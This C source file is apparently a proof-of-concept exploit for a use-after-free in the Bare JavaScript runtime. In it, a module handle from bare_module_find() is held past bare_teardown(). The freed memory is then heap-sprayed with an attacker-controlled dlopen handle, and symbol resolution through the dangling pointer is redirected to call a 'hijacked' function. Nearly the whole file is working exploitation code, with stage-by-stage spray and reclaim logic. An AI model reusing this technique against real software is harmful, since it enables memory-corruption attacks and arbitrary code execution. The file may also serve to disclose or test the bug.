#include <assert.h>
#include <bare.h>
#include <js.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <uv.h>

// `bare_module_find()` returns `&addon->lib`, a pointer into an addon list node
// that `bare_addon_teardown()` frees when the runtime is torn down. Holding that
// pointer past teardown is a use-after-free, and the freed slot can be reclaimed
// with data we "control".

#define SPRAY_COUNT 4096

// The function an attacker wants resolved and called through the dangling handle.
__attribute__((used, visibility("default"))) void
hijacked(void) {
  fprintf(stderr, "  [hijacked] our code ran via a dangling bare_module_find() handle\n");
}

static const char *code =
  "const url = require('bare-url')\n"
  "const { Addon } = Bare\n"
  "const a = new Addon(url.pathToFileURL(`./test/fixtures/addon/prebuilds/${Addon.host}/addon.bare`))\n"
  "if (a.exports !== 'Hello from addon') throw new Error('Addon was not loaded')\n";

// stage 1: load the addon, resolve it by name, then tear the process down so the
// node behind the returned handle is freed. Returns the now-dangling handle.
static uv_lib_t *
stage1_dangling_handle(js_platform_t *platform, int argc, char **argv) {
  int e;

  char filename[4096];
  size_t len = sizeof(filename);

  e = uv_cwd(filename, &len);
  assert(e == 0);

  e = snprintf(&filename[len], sizeof(filename) - len, "/test.js");
  assert(e > 0);

  bare_t *bare;
  e = bare_setup(uv_default_loop(), platform, NULL, argc, (const char **) argv, NULL, &bare);
  assert(e == 0);

  uv_buf_t source = uv_buf_init((char *) code, strlen(code));

  e = bare_load(bare, filename, &source, NULL);
  assert(e == 0);

  uv_lib_t *lib = bare_module_find("addon");
  assert(lib != NULL);

  e = bare_run(bare, UV_RUN_DEFAULT);
  assert(e == 0);

  int exit_code = 0;

  e = bare_teardown(bare, UV_RUN_DEFAULT, &exit_code);
  assert(e == 0);
  assert(exit_code == 0);

  fprintf(stderr, "stage 1: dangling lib->handle = %p  (freed by teardown)\n", lib->handle);

  return lib;
}

// stage 2: reclaim the freed slot, filling it with a real dlopen handle we made
// so the dangling lib->handle points at a library we control. Returns 0 on hit.
static int
stage2_spray_handle(uv_lib_t *lib, uintptr_t our_handle) {
  static const size_t sizes[] = {64, 96, 128, 147, 160, 176, 192, 224, 256, 320, 384, 512};

  uint8_t **spray = malloc(SPRAY_COUNT * sizeof(uint8_t *));
  assert(spray != NULL);

  for (size_t s = 0; s < sizeof(sizes) / sizeof(sizes[0]); s++) {
    for (int i = 0; i < SPRAY_COUNT; i++) {
      spray[i] = malloc(sizes[s]);
      assert(spray[i] != NULL);

      for (size_t o = 0; o + sizeof(our_handle) <= sizes[s]; o += sizeof(our_handle)) {
        memcpy(spray[i] + o, &our_handle, sizeof(our_handle));
      }
    }

    if ((uintptr_t) lib->handle == our_handle) break; // keep this wave live

    for (int i = 0; i < SPRAY_COUNT; i++)
      free(spray[i]);
  }

  fprintf(stderr, "stage 2: dangling lib->handle = %p  (sprayed, ours = %p)\n", lib->handle, (void *) our_handle);

  return (uintptr_t) lib->handle == our_handle ? 0 : -1;
}

// stage 3: resolve a symbol through the dangling handle and call it.
static void
stage3_hijack(uv_lib_t *lib) {
  void *sym = NULL;

  int e = uv_dlsym(lib, "hijacked", &sym);

  fprintf(stderr, "stage 3: uv_dlsym(dangling lib, \"hijacked\") -> %p  (real &hijacked = %p)\n", sym, (void *) hijacked);

  if (e == 0 && sym == (void *) hijacked) {
    fprintf(stderr, "stage 3: resolution redirected through our library; calling it...\n");
    ((void (*)(void)) sym)();
  }
}

int
main(int argc, char *argv[]) {
  int e;

  argc = 0;
  argv = NULL;

  argv = uv_setup_args(argc, argv);

  // The library we control
  uv_lib_t ours;
  e = uv_dlopen(NULL, &ours);
  assert(e == 0);

  js_platform_t *platform;
  e = js_create_platform(uv_default_loop(), NULL, &platform);
  assert(e == 0);

  uv_lib_t *lib = stage1_dangling_handle(platform, argc, argv);

  if (stage2_spray_handle(lib, (uintptr_t) ours.handle) == 0) {
    stage3_hijack(lib);
  } else {
    fprintf(stderr, "stage 2: slot not reclaimed with our handle this run\n");
  }

  e = js_destroy_platform(platform);
  assert(e == 0);

  e = uv_run(uv_default_loop(), UV_RUN_DEFAULT);
  assert(e == 0);

  return 0;
}
